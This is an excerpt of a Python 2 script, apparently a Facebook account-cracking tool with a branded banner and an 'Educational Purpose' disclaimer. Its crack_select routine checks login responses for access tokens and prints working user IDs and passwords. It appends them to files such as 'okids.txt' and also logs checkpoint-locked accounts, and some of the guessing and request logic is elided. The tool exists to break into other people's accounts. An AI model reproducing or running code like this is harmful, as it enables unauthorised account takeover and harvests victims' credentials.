...
\n\033[0m----------BAP BOLTI PUBLIC-------------------
\033[1;92mAuthor \033[1;93m: ISMAIL BALOXH
\033[1;92mFb \033[1;95m:     ISMAIL BALOCH
\033[1;92mDisclaimer \033[1;93m: Its For Educational Purpose
\033[0m-------------KEEP LEARNING-----------------------
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/Ismailbaloxh.08')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://youtube.com/fZEetuWO3DA')
        main()
    else:
        print ''
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#THANKS ISMAIL
    print 45 * '_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[ISMAIL-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ISMAIL okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[ISMAIL-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[ISMAIL-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
